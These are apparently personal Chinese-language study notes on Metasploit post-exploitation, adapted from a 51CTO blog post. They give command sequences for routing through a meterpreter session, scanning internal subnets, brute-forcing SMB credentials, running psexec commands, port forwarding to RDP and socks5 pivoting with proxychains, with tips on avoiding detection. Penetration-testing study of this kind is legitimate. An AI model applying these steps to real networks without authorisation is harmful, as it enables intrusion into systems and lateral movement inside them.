# 1. 添加路由
- shell --> ipconfig
- run get_local_subnet
- route list
- run autoroute -s 【网段】                    //添加路由表方法一（在metepreter中）
- run autoroute -p                             //打印路由表
- backgroud --> route add 【网段】【掩码】【session id】      //添加路由表
- backgroud --> route remove 【网段】【掩码】【session id】   //删除路由表
- route print    //打印路由表（msf机器的）
- run arp_scanner -r          //扫描是否有存活主机（慎重考虑，使用该命令极易引起注意）

- 注意是在 metepreter 中添加路由
![[Pasted image 20230102103726.png]]

用arp扫描，实战还是建议用其他扫描，**在msf中使用nmap扫描比arp靠谱多了**。如果希望扫描端口，可以background后直接use一个portscan（如：auxiliary/scanner/portscan/tcp），然后把hosts设置为192.168.100.0/24

# 2. 连接数据库 postgresql
- 如果不连接数据库，msf一关，自己的渗透成果就没了
- apt-get install postgresql -y
 
## 配置 postgresql
修改postgresql系统用户密码：
> echo "postgres:(想要修改的密码)" | chpasswd      （这个是不交互的，执行就完事了）
> 修改postgresql数据库中默认用户postgres的密码
> su postgres
> psql
> \password postgres    (这里是修改数据库的密码)
> \q                  （退出）
> exit                 （返回root用户）

![[Pasted image 20230102104315.png]]

## msf 连接数据库
1. 把 db_connect postgres:password@127.0.0.1/msfdb 保存为⽂件 connection.rc
2. msfconsole -r connection.rc

- db_status          //查看数据库连接状态
- creds               //查看数据库记录
- 注：msfdb为新建的数据库，可以随意填写

常见问题：
1. sudo service postgresql start
2. 如果在msf中使用db_connect postgres:password@127.0.0.1/msfdb时爆出一下错误：
![[Pasted image 20230102110352.png]]
- 再开一个终端模拟器，输入psql后新建数据库即可
![[Pasted image 20230102110415.png]]

# 3. smb密码爆破+远程命令执行 
1、先添加路由，以便后续的端口扫描：
2、这里对整个网段进行端口扫描，发现106这台机子开放了445和3389端口
3、这里使用auxiliary/scanner/smb/smb_login，爆破smb，由于只是演示，我的smbuser和smbpass都只填了一个，实际应用中可以利用字典，例如：set rhosts file:/root/ip.txt、set userpass_file（添加密码字典）、set user_file  （添加账号字典）
实战中爆破不会很快的
远程命令执行：
search psexec 远程命令执行  这东西，个人感觉不大好用
use 1
set command whoami
set rohosts IP
exploit
四、MSF端口转发
1、端口转发：
命令其实很简单 portfwd add -l <msf接收的端口> -p <希望对方转出来的端口> -r <对方ip>
2、mstsc打开远程桌面连接，直接连上msf机器的6666端口就成了
五、Socks 代理
1、socks代理使用目的：
打个比方，如果你发现对方的web服务器后面还有三台内网机器，分别是OA、FTP、数据库服务器，如果这时候使用 socks 代理在我们的vps与web服务器上搭建了一条隧道，此时我们就相当于“进入”web服务器体内，这就意味这我们可以通内网，对这三台内网机器为所欲为了。注意：Socks代理不支持icmp和arp协议
2、当我们拿到metepreter后，需要先添加一个路由
3、接着我们background，将session放至后台，在查找一下socks模块，这里我们选择socks5
4、配置一下选项，注意，如果srvhost为0.0.0.0时意味着其他用户都可以利用端口进入这条隧道，内网渗透时最好不要这样，有被发现的风险，因此我们可以设置srvhost为127.0.0.1，这样只有我们能使用了
5、运行，然后jobs一下，发现已经开启进程了
6、这里我们需要使用proxychains工具 ，可以直接用apt-get install proxychains 安装一下，接着我们用vi /etc/proxychains.conf  命令，拉到最下面更改一下配置，更改为我们刚刚配置socks5时使用的设置
7、然后就可以使用proxychains curl http://192.168.100.97 ，尝试连接内网了

# Reference
- [MSF之基础横向渗透_51CTO博客_MSF技术](https://blog.51cto.com/u_15127652/4340505)
